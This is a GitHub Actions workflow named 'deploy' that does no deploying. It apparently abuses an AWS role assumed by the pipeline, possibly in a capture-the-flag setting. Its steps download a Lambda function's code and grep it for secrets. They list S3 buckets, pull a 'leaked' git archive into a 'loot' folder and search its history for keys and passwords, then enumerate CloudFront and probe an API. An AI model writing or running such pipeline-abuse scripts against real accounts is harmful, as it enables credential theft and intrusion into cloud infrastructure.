name: deploy

on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: |
          aws sts get-caller-identity

      - name: Lambda info
        run: |
          echo "===== LAMBDA CONFIG ====="
          aws lambda get-function-configuration \
            --function-name nslookupv2

          echo "===== DOWNLOAD LAMBDA ====="
          mkdir -p lambda_code

          aws lambda get-function \
            --function-name nslookupv2 \
            --query 'Code.Location' \
            --output text > lambda_url

          curl -s $(cat lambda_url) -o lambda.zip

          unzip -o lambda.zip -d lambda_code

          echo "===== FILES ====="
          find lambda_code -type f

          echo "===== SEARCH ====="
          grep -RniE "flag|secret|key|token|password|s3|aws|lambda|http" lambda_code || true


      - name: S3 discovery
        run: |
          echo "===== BUCKETS ====="
          aws s3 ls

          echo "===== PLATFORM ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ || true

          echo "===== SITE ====="
          aws s3 ls s3://site781fe43f26b9eba3/ || true


      - name: Download leaked git
        run: |
          mkdir -p loot

          aws s3 cp \
          s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
          loot/dotgit.zip

          unzip -o loot/dotgit.zip -d loot/dotgit

          echo "===== GIT FILES ====="
          find loot/dotgit/.git -type f | head

          echo "===== SEARCH GIT HISTORY ====="
          cd loot/dotgit

          git log --all --stat

          git grep -nEi "flag|secret|key|token|password|aws|lambda|s3|api" $(git rev-list --all) || true


      - name: CloudFront
        run: |
          echo "===== CLOUDFRONT ====="
          aws cloudfront list-distributions || true


      - name: Test API
        run: |
          echo "===== API TEST ====="

          curl -i -X POST \
          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
          -H "Content-Type: application/json" \
          -d '{"domain":"example.com"}'
